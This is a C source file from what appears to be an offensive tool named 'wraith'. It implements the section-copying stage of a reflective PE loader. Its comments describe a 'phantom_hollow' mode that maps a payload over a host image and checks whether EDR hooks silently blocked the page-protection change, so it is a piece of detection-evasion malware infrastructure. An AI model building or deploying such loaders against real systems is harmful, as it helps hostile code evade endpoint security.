/*
 * src/loader/loader_sections.c
 *
 * Copy each PE section from the source buffer into the loaded image.
 * Sections without raw data still consume virtual space (BSS, etc.) -
 * the mapping vtable is responsible for committing them as zeroed RW.
 */

#include "core/wr_context_internal.h"
#include "core/wr_ptr_check.h"
#include "loader/loader_pipeline.h"
#include "mapping/map_strategy.h"
#include "pe/pe_iter.h"
#include "pe/pe_constants.h"

#include <string.h>

wraith_status_t wr_load_sections_copy(struct wr_ctx *ctx,
  const wr_pe_view *src)
{
  if (!ctx || !src || !src->nt || !src->dos) {
  return WRAITH_E_NULL_ARG;
  }
  if (!wr_looks_like_valid_base(ctx->image_base)) {
  return wr_ctx_fail(ctx, WRAITH_E_INVALID_HANDLE,
  "copy_sections: image_base=%p is not a valid mapping",
  (void *)ctx->image_base);
  }

  /* Copy headers first - the loaded image must have a valid PE header
  * at offset 0 so the rest of the loader can keep using ctx->headers. */
  size_t hdr_sz = src->nt->OptionalHeader.SizeOfHeaders;
  memcpy(ctx->image_base, src->buffer, hdr_sz);

  /* Read-back validation: under phantom_hollow the destination is a
  * SEC_IMAGE view that started in PAGE_EXECUTE_WRITECOPY. The bulk
  * RW flip in ph_reserve normally promotes those pages to plain
  * PAGE_READWRITE so memcpy generates clean private pages. Some
  * Win11 24H2 EDR hooks have been observed acknowledging the
  * NtProtect with STATUS_SUCCESS without actually flipping the
  * page; the memcpy then no-ops silently and we end up reading the
  * host's original bytes instead of the payload's. Detect that
  * here by re-reading the magic. */
  uint16_t mz_check = 0;
  memcpy(&mz_check, ctx->image_base, sizeof(mz_check));
  if (mz_check != WRAITH_PE_DOS_SIGNATURE) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "copy_sections: header memcpy did not stick "
  "(read-back magic=0x%04x; CoW protection flip likely "
  "intercepted)", (unsigned)mz_check);
  }

  /* Re-point ctx->headers at the *copied* NT headers so subsequent
  * phases (relocs, imports, exports) read them from the loaded
  * image. We also patch the ImageBase field to reflect the actual
  * load address. */
  if (src->dos->e_lfanew <= 0 ||
      (size_t)src->dos->e_lfanew + sizeof(wr_pe_nt_headers64) > hdr_sz) {
  return wr_ctx_fail(ctx, WRAITH_E_PE_BAD_DOS_MAGIC,
  "copy_sections: e_lfanew=%ld out of headers range",
  (long)src->dos->e_lfanew);
  }
  wr_pe_nt_headers64 *nt_in_image =
  (wr_pe_nt_headers64 *)(ctx->image_base + src->dos->e_lfanew);
  nt_in_image->OptionalHeader.ImageBase = (uint64_t)(uintptr_t)ctx->image_base;
  ctx->headers = nt_in_image;

  /* Copy each section. */
  wr_pe_section_iter it;
  wr_pe_section_iter_init(&it, src);
  const wr_pe_section_header *s;

  while ((s = wr_pe_section_iter_next(&it)) != NULL) {
  uint8_t *dest = ctx->image_base + s->VirtualAddress;

  if (s->SizeOfRawData == 0) {
  /* BSS-style section. The mapping reserve already committed
  * the whole image, so just zero it. */
  uint32_t vsize = s->VirtualSize ? s->VirtualSize
  : src->nt->OptionalHeader.SectionAlignment;
  memset(dest, 0, vsize);
  continue;
  }

  /* Bounds-check raw data against the source buffer (the validator
  * already did this, but re-asserting protects against memory
  * corruption between phases). */
  size_t raw_end = (size_t)s->PointerToRawData + (size_t)s->SizeOfRawData;
  if (raw_end > src->buffer_size) {
  return wr_ctx_fail(ctx, WRAITH_E_PE_TRUNCATED,
  "section %u raw data out of bounds",
  (unsigned)(s - src->sections));
  }

  memcpy(dest, src->buffer + s->PointerToRawData, s->SizeOfRawData);
  }

  return WRAITH_OK;
}
